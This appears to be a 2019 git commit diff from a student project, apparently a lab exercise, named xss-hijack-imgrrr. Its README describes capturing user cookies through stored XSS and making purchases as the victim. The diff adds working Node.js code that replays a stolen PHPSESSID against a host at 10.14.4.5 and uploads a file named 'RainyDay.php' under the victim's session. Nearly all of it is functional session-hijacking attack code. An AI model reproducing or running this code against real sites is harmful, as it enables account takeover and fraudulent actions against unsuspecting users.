f6e811dbda77b1749cf3ffe4a2731649cacbfe7d
Jethro <mlljet002@myuct.ac.za>
2019-01-15 17:32:20 +0200

    Functionality Complete

--- README.md
+++ README.md
@@ -1,2 +1,6 @@
 # xss-hijack-imgrrr
 Captures user cookies transmitted via stored XSS and then performs a purchase on behalf of the user whos cookies have been captured.
+
+It currently uploads 'RainyDay.jpg' to a logged in users account.
+
+The script in `payload.js` is what was injected to exploit the XSS vulnerability.
--- app.js
+++ app.js
@@ -3,10 +3,38 @@ const server = express();
 const bodyParser = require('body-parser');
 const request = require('request').defaults({ jar: true });
 const cookieParser = require('cookie-parser');
+const fs = require('fs');
+
 
 const urlencodedParser = bodyParser.urlencoded({ extended: true });
 
 // Item Submit Post Route
+
+const uploadFile = () => {
+    let options = {
+        url: 'http://10.14.4.5/pictures/upload.php',
+        headers: {
+            'MAX_FILE_SIZE': '10485760',
+            'Content-Type': 'multipart/form-data',
+        },
+        formData: {
+            'title': 'RainyDay.php',
+            'tag': 'RainyDay.php',
+            'price': '1000',
+            'pic': fs.createReadStream('./RainyDay.jpg'),
+            'name': 'RainyDay.php',
+        }
+    };
+    return new Promise((resolve, reject) => {
+        request.post(options, (error, res, body) => {
+            if (!error && res.statusCode == 303) {
+                resolve(res);
+            } else {
+                reject(error);
+            }
+        });
+    })
+}
 
 const login = (cookie) => {
     let cookieString = 'PHPSESSID='.concat(cookie.PHPSESSID);
@@ -15,16 +43,23 @@ const login = (cookie) => {
     let cookieParam = request.cookie(cookieString);
     j.setCookie(cookieParam, 'http://10.14.4.5');
     let options = {
-        url: 'http://10.14.4.5',
+        url: 'http://10.14.4.5/pictures/upload.php',
         jar: j,
         headers:
         {
-            'content-type': 'application/x-www-form-urlencoded',
+            'Content-Type': 'multipart/form-data',
             'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101, Firefox/60.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate',
+            'MAX_FILE_SIZE': '10485760',
         },
+        formData: {
+            'title': 'RainyDay.php',
+            'tag': 'RainyDay.php',
+            'price': '1000',
+            'pic': fs.createReadStream('./RainyDay.jpg'),
+            'name': 'RainyDay.php',
+        }
     };
     return new Promise((resolve, reject) => {
         request.post(options, (error, res, body) => {
